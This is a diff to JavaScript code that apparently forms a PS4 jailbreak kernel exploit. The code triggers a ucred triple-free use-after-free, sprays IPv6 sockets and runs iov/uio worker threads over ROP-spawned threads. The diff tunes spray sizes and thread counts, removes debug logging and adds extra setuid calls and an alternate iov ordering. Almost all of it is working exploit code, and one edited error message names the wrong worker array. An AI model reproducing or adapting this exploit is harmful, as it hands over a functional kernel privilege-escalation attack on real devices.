@@ -114,8 +114,8 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 96;
-var IOV_THREAD_NUM = 8;
+var IPV6_SOCK_NUM = 512;
+var IOV_THREAD_NUM = 16;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 4;
@@ -507,39 +507,39 @@ function trigger_iov_recvmsg() {
 }
 function wait_iov_recvmsg() {
   var worker;
+  // Wait for completition
   for (var i = 0; i < IOV_THREAD_NUM; i++) {
     worker = iov_recvmsg_workers[i];
-    log("[WAIT] iov_recvmsg[" + i + "]: waiting at " + hex(worker.done));
     wait_for(worker.done, 1);
-    log("[WAIT] iov_recvmsg[" + i + "]: done=" + read64(worker.done));
+    // debug("Worker done: " + hex(read64(worker.done)) );
   }
+
+  // debug("iov_recvmsg workers run OK");
 }
 function trigger_ipv6_spray_and_read() {
-  log("[TRIGGER] ipv6_spray_and_read: start");
+  // Worker information is already loaded
 
+  // Clear done signals
   write64(spray_ipv6_worker.done, 0);
 
+  // Spawn ipv6_sockets spray and read worker
+  // Passing an stack addr reserved for each iteration
   var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
   if (ret.eq(BigInt_Error)) {
     throw new Error('Could not spray_ipv6_worker');
   }
+  var thread_id = Number(ret.and(0xFFFFFFFF)); // Convert to 32bits value
+  spray_ipv6_worker.thread_id = thread_id; // Save thread ID
 
-  var thread_id = Number(ret.and(0xFFFFFFFF));
-  spray_ipv6_worker.thread_id = thread_id;
-
-  log("[TRIGGER] ipv6_spray_and_read: spawned thread id=" + thread_id);
-
+  // Send Init signal
   ret = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
   if (ret.eq(BigInt_Error)) {
     throw new Error("Could not signal 'run' spray_ipv6_worker");
   }
-
-  log("[TRIGGER] ipv6_spray_and_read: signaled run");
 }
 function wait_ipv6_spray_and_read() {
-  log("[WAIT] ipv6_spray_and_read: waiting for done=1 at " + hex(spray_ipv6_worker.done));
+  // Wait for completition
   wait_for(spray_ipv6_worker.done, 1);
-  log("[WAIT] ipv6_spray_and_read: done value now = " + read64(spray_ipv6_worker.done));
 }
 function trigger_uio_readv() {
   var worker;
@@ -561,37 +561,39 @@ function trigger_uio_readv() {
 }
 function wait_uio_readv() {
   var worker;
+  // Wait for completition
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     worker = uio_readv_workers[i];
-    log("[WAIT] uio_readv[" + i + "]: waiting at " + hex(worker.done));
     wait_for(worker.done, 1);
-    log("[WAIT] uio_readv[" + i + "]: done=" + read64(worker.done));
   }
+  // debug("Exit wait_uio_readv()");
 }
 function trigger_uio_writev() {
-  log("[TRIGGER] uio_writev: start");
-
+  var worker;
+  // Clear done signals
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    var worker = uio_writev_workers[i];
+    worker = uio_writev_workers[i];
     write64(worker.done, 0);
+    // debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
   }
 
-  for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    var worker = uio_writev_workers[i];
+  // Send Init signal
+  for (var _i7 = 0; _i7 < UIO_THREAD_NUM; _i7++) {
+    worker = uio_writev_workers[_i7];
     var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
     if (ret.eq(BigInt_Error)) {
-      throw new Error("Could not signal 'run' uio_writev_workers[" + i + "]");
+      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + _i7 + ']');
     }
-    log("[TRIGGER] uio_writev: signaled worker " + i);
   }
 }
 function wait_uio_writev() {
+  var worker;
+  // Wait for completition
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    var worker = uio_writev_workers[i];
-    log("[WAIT] uio_writev[" + i + "]: waiting at " + hex(worker.done));
+    worker = uio_writev_workers[i];
     wait_for(worker.done, 1);
-    log("[WAIT] uio_writev[" + i + "]: done=" + read64(worker.done));
   }
+  // debug("Exit wait_uio_writev()");
 }
 function init() {
   log('***** Starting PS4 Jailbreak *****');
@@ -1268,6 +1270,7 @@ function remove_uaf_file() {
 // ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
+var USE_ALT_IOV_ORDER = false;
 function trigger_ucred_triplefree() {
   var end = false;
 
@@ -1286,11 +1289,13 @@ function trigger_ucred_triplefree() {
 
     // 2) allocate new ucred
     setuid(1);
+    setuid(1);
 
     // 3) reclaim fd → uaf_socket
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
 
     // 4) free previous ucred
+    setuid(1);
     setuid(1);
 
     // 5) unregister → free file + ucred
@@ -1322,13 +1327,20 @@ function trigger_ucred_triplefree() {
     // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
     var count = 0;
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      // شغّل recvmsg
-      trigger_iov_recvmsg();
+      
+      
+      if (USE_ALT_IOV_ORDER) {
+          write(new BigInt(iov_sock_1), tmp, 1);
+          trigger_iov_recvmsg();
+          read(new BigInt(iov_sock_0), tmp, 1);
+          wait_iov_recvmsg();
+      } else {
+          trigger_iov_recvmsg();
+          write(new BigInt(iov_sock_1), tmp, 1);
+          wait_iov_recvmsg();
+          read(new BigInt(iov_sock_0), tmp, 1);
+      }
 
-      // كمّل دورة iov بالكامل
-      write(new BigInt(iov_sock_1), tmp, 1);
-      wait_iov_recvmsg();
-      read(new BigInt(iov_sock_0), tmp, 1);
 
       // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
